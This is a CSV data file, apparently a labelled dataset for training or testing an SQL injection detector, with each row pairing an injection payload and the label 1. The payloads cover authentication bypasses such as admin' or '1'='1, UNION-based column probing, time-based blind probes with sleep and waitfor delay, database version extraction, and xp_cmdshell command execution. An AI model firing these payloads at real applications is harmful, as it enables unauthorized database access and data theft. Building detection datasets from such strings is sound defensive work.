payload,label
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))",1
"AND 5650=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))",1
AND 3516=CAST((CHR(113)||CHR(106)||CHR(122)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (3516=3516) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(106)||CHR(107)||CHR(113)) AS NUMERIC),1
"AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)",1
"UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL--",1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30",1
UNION ALL SELECT 'INJ'||'ECT'||'XXX'--,1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--",1
UNION ALL SELECT 'INJ'||'ECT'||'XXX'#,1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#",1
-',1
 ',1
&',1
^',1
*',1
 or ''-',1
 or '' ',1
 or ''&',1
 or ''^',1
 or ''*',1
-,1
""" """,1
&,1
^,1
*,1
" or ""-",1
" or "" ",1
" or ""&",1
" or ""^",1
" or ""*",1
or true--,1
" or true--
' or true--
) or true--",1
) or true--,1
 or 'x'='x,1
) or ('x')=('x,1
)) or (('x'))=(('x,1
" or x""=""x",1
") or (x"")=(""x",1
")) or ((x""))=((""x",1
or 1=1,1
or 1=1--,1
or 1=1#,1
or 1=1/*,1
admin' --,1
admin' #,1
admin'/*,1
admin' or '1'='1,1
admin' or '1'='1'--,1
admin' or '1'='1'#,1
admin' or '1'='1'/*,1
admin'or 1=1 or ''=',1
admin' or 1=1,1
admin' or 1=1--,1
admin' or 1=1#,1
admin' or 1=1/*,1
admin') or ('1'='1,1
admin') or ('1'='1'--,1
admin') or ('1'='1'#,1
admin') or ('1'='1'/*,1
admin') or '1'='1,1
admin') or '1'='1'--,1
admin') or '1'='1'#,1
admin') or '1'='1'/*,1
"1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",1
"admin"" --",1
"admin"" #",1
"admin""/*",1
"admin"" or ""1""=""1",1
"admin"" or ""1""=""1""--",1
"admin"" or ""1""=""1""#",1
"admin"" or ""1""=""1""/*",1
"admin""or 1=1 or """"=""",1
"admin"" or 1=1",1
"admin"" or 1=1--",1
"admin"" or 1=1#",1
"admin"" or 1=1/*",1
"admin"") or (""1""=""1",1
"admin"") or (""1""=""1""--",1
"admin"") or (""1""=""1""#",1
"admin"") or (""1""=""1""/*",1
"admin"") or ""1""=""1",1
"admin"") or ""1""=""1""--",1
"admin"") or ""1""=""1""#",1
"admin"") or ""1""=""1""/*",1
"1234 "" AND 1=0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",1
sleep(__TIME__)#,1
1 or sleep(__TIME__)#,1
" or sleep(__TIME__)#
' or sleep(__TIME__)#
 or sleep(__TIME__)=""",1
 or sleep(__TIME__)=',1
1) or sleep(__TIME__)#,1
) or sleep(__TIME__)=,1
) or sleep(__TIME__)=',1
1)) or sleep(__TIME__)#,1
)) or sleep(__TIME__)=,1
)) or sleep(__TIME__)=',1
;waitfor delay '0:0:__TIME__'--,1
);waitfor delay '0:0:__TIME__'--,1
;waitfor delay '0:0:__TIME__'--,1
";waitfor delay '0:0:__TIME__'--
');waitfor delay '0:0:__TIME__'--
);waitfor delay '0:0:__TIME__'--",1
));waitfor delay '0:0:__TIME__'--,1
));waitfor delay '0:0:__TIME__'--,1
"));waitfor delay '0:0:__TIME__'--
benchmark(10000000,MD5(1))#
1 or benchmark(10000000,MD5(1))#
 or benchmark(10000000,MD5(1))#",1
" or benchmark(10000000,MD5(1))#",1
"1) or benchmark(10000000,MD5(1))#",1
") or benchmark(10000000,MD5(1))#
') or benchmark(10000000,MD5(1))#
1)) or benchmark(10000000,MD5(1))#
)) or benchmark(10000000,MD5(1))#",1
")) or benchmark(10000000,MD5(1))#",1
OR 1=1,1
OR 1=0,1
OR x=x,1
OR x=y,1
OR 1=1#,1
OR 1=0#,1
OR x=x#,1
OR x=y#,1
OR 1=1--,1
OR 1=0--,1
OR x=x--,1
OR x=y--,1
OR 3409=3409 AND ('pytW' LIKE 'pytW,1
OR 3409=3409 AND ('pytW' LIKE 'pytY,1
HAVING 1=1,1
HAVING 1=0,1
HAVING 1=1#,1
HAVING 1=0#,1
HAVING 1=1--,1
HAVING 1=0--,1
AND 1=1,1
AND 1=0,1
AND 1=1--,1
AND 1=0--,1
AND 1=1#,1
AND 1=0#,1
AND 1=1 AND '%'=',1
AND 1=0 AND '%'=',1
AND 1083=1083 AND (1427=1427,1
AND 7506=9091 AND (5913=5913,1
AND 1083=1083 AND ('1427=1427,1
AND 7506=9091 AND ('5913=5913,1
AND 7300=7300 AND 'pKlZ'='pKlZ,1
AND 7300=7300 AND 'pKlZ'='pKlY,1
AND 7300=7300 AND ('pKlZ'='pKlZ,1
AND 7300=7300 AND ('pKlZ'='pKlY,1
AS INJECTX WHERE 1=1 AND 1=1,1
AS INJECTX WHERE 1=1 AND 1=0,1
AS INJECTX WHERE 1=1 AND 1=1#,1
AS INJECTX WHERE 1=1 AND 1=0#,1
AS INJECTX WHERE 1=1 AND 1=1--,1
AS INJECTX WHERE 1=1 AND 1=0--,1
WHERE 1=1 AND 1=1,1
WHERE 1=1 AND 1=0,1
WHERE 1=1 AND 1=1#,1
WHERE 1=1 AND 1=0#,1
WHERE 1=1 AND 1=1--,1
WHERE 1=1 AND 1=0--,1
ORDER BY 1--,1
ORDER BY 2--,1
ORDER BY 3--,1
ORDER BY 4--,1
ORDER BY 5--,1
ORDER BY 6--,1
ORDER BY 7--,1
ORDER BY 8--,1
ORDER BY 9--,1
ORDER BY 10--,1
ORDER BY 11--,1
ORDER BY 12--,1
ORDER BY 13--,1
ORDER BY 14--,1
ORDER BY 15--,1
ORDER BY 16--,1
ORDER BY 17--,1
ORDER BY 18--,1
ORDER BY 19--,1
ORDER BY 20--,1
ORDER BY 21--,1
ORDER BY 22--,1
ORDER BY 23--,1
ORDER BY 24--,1
ORDER BY 25--,1
ORDER BY 26--,1
ORDER BY 27--,1
ORDER BY 28--,1
ORDER BY 29--,1
ORDER BY 30--,1
ORDER BY 31337--,1
ORDER BY 1#,1
ORDER BY 2#,1
ORDER BY 3#,1
ORDER BY 4#,1
ORDER BY 5#,1
ORDER BY 6#,1
ORDER BY 7#,1
ORDER BY 8#,1
ORDER BY 9#,1
ORDER BY 10#,1
ORDER BY 11#,1
ORDER BY 12#,1
ORDER BY 13#,1
ORDER BY 14#,1
ORDER BY 15#,1
ORDER BY 16#,1
ORDER BY 17#,1
ORDER BY 18#,1
ORDER BY 19#,1
ORDER BY 20#,1
ORDER BY 21#,1
ORDER BY 22#,1
ORDER BY 23#,1
ORDER BY 24#,1
ORDER BY 25#,1
ORDER BY 26#,1
ORDER BY 27#,1
ORDER BY 28#,1
ORDER BY 29#,1
ORDER BY 30#,1
ORDER BY 31337#,1
ORDER BY 1,1
ORDER BY 2,1
ORDER BY 3,1
ORDER BY 4,1
ORDER BY 5,1
ORDER BY 6,1
ORDER BY 7,1
ORDER BY 8,1
ORDER BY 9,1
ORDER BY 10,1
ORDER BY 11,1
ORDER BY 12,1
ORDER BY 13,1
ORDER BY 14,1
ORDER BY 15,1
ORDER BY 16,1
ORDER BY 17,1
ORDER BY 18,1
ORDER BY 19,1
ORDER BY 20,1
ORDER BY 21,1
ORDER BY 22,1
ORDER BY 23,1
ORDER BY 24,1
ORDER BY 25,1
ORDER BY 26,1
ORDER BY 27,1
ORDER BY 28,1
ORDER BY 29,1
ORDER BY 30,1
ORDER BY 31337,1
RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=',1
RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=',1
IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--,1
IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--,1
%' AND 8310=8310 AND '%'=',1
%' AND 8310=8311 AND '%'=',1
"and (select substring(@@version,1,1))='X'",1
"and (select substring(@@version,1,1))='M'",1
"and (select substring(@@version,2,1))='i'",1
"and (select substring(@@version,2,1))='y'",1
"and (select substring(@@version,3,1))='c'",1
"and (select substring(@@version,3,1))='S'",1
"and (select substring(@@version,3,1))='X'",1
)%20or%20('x'='x,1
%20or%201=1,1
; execute immediate 'sel' || 'ect us' || 'er',1
"benchmark(10000000,MD5(1))#",1
""";waitfor delay '0:0:__TIME__'--",1
1) or pg_sleep(__TIME__)--,1
"||(elt(-3+5,bin(15),ord(10),hex(char(45))))",1
"hi"""""""") or (""""""""a""""""""=""""""""a""""""",1
delete,1
like,1
""" or sleep(__TIME__)#",1
pg_sleep(__TIME__)--,1
*(|(objectclass=*)),1
declare @q nvarchar (200) 0x730065006c00650063 ...,1
 or 0=0 #,1
1) or sleep(__TIME__)#,1
) or ('a'='a,1
; exec xp_regread,1
@var select @var as var into temp end --,1
"1)) or benchmark(10000000,MD5(1))#",1
(||6),1
"a"""""""" or 3=3--""""""",1
""" or benchmark(10000000,MD5(1))#",1
# from wapiti,1
 or 0=0 --,1
1 waitfor delay '0:0:10'--,1
 or 'a'='a,1
"hi or 1=1 --""",1
or a = a,1
 UNION ALL SELECT,1
) or sleep(__TIME__)=',1
")) or benchmark(10000000,MD5(1))#",1
hi' or 'a'='a,1
%,1
limit,1
 or 1=1,1
 or 2 > 1,1
""")) or benchmark(10000000,MD5(1))#",1
hi') or ('a'='a,1
 or 3=3,1
));waitfor delay '0:0:__TIME__'--,1
a' waitfor delay '0:0:10'--,1
"1;(load_file(char(47,101,116,99,47,112,97,115, ...",1
or%201=1,1
1 or sleep(__TIME__)#,1
or 1=1,1
 and 1 in (select var from temp)--,1
 or '7659'='7659,1
 or 'text' = n'text',1
--,1
 or 1=1 or ''=',1
declare @s varchar (200) select @s = 0x73656c6 ...,1
exec xp,1
; exec master..xp_cmdshell 'ping 172.10.1.255'--,1
" or pg_sleep(__TIME__)--""",1
x' AND email IS NULL; --,1
admin' or ',1
 or 'unusual' = 'unusual',1
"1) or benchmark(10000000,MD5(1))#",1
\x27UNION SELECT,1
declare @s varchar(200) select @s = 0x77616974 ...,1
tz_offset,1
sqlvuln,1
"""));waitfor delay '0:0:__TIME__'--",1
||6,1
or%201=1 --,1
%2A%28%7C%28objectclass%3D%2A%29%29,1
or a=a,1
) union select * from information_schema.tables;,1
PRINT @@variable,1
or isNULL(1/0) /*,1
26 %,1
"or """"a""""=""""a""",1
(sqlvuln),1
